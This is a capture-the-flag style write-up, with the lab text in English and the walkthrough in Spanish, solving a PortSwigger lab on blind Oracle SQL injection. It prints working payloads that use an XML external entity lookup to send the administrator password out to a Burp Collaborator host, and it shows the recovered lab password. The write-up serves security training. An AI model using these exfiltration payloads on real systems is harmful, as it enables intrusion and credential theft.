# Lab: Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user. 

`Note`: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. 

[SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)


---
Objetivos:
- Explotar una SQLi e imprimir la contraseña del usuario `administrator`.
- Autenticarse como `administrator`.

---

Iniciamos el laboratorio y nos encontramos con un shop online, el cual tiene el parámetro `TrackingId` vulnerable:
<img width="1506" height="781" alt="image" src="https://github.com/user-attachments/assets/63f4a52e-704f-40d9-b43c-afb3aee2f0bb" />

Obtenemos nuestro cliente Collaborator: `ibxpii8obs96pxojmvp46wjkpbv2jt7i.oastify.com`

Podemos utilizar el payload del laboratorio anterior para realizar un DNS lookup:
```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3lpas3i9ldjrziy4wgzpght5zw5ntdh2.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
<img width="1887" height="856" alt="image" src="https://github.com/user-attachments/assets/345a77fe-6c62-4844-b9ca-6bfb6cc9fd82" />


Vemos que obtenemos peticiones a nuestro Collaborator, por lo que confirmamos que nos encontramos ante un motor Oracle.

Utilizamos nuestro SQLi Cheat sheet y e inyectamos el payload para exfiltrar data correspondiente a Oracle:


```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.ibxpii8obs96pxojmvp46wjkpbv2jt7i.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
<img width="1885" height="811" alt="image" src="https://github.com/user-attachments/assets/3688d6c0-c787-42aa-a3d3-916ff428f513" />

Collaborator:
<img width="1465" height="725" alt="image" src="https://github.com/user-attachments/assets/3177d472-5daa-418b-b087-6e17a67595eb" />

Password: `iqor6fz3ko932k28eqrs`

Nos autenticamos con las credenciales `administrator`:`iqor6fz3ko932k28eqrs` y resolvemos el laboratorio:

<img width="1477" height="776" alt="image" src="https://github.com/user-attachments/assets/f85b7774-f833-42c6-b2cb-5ea567c15bdb" />


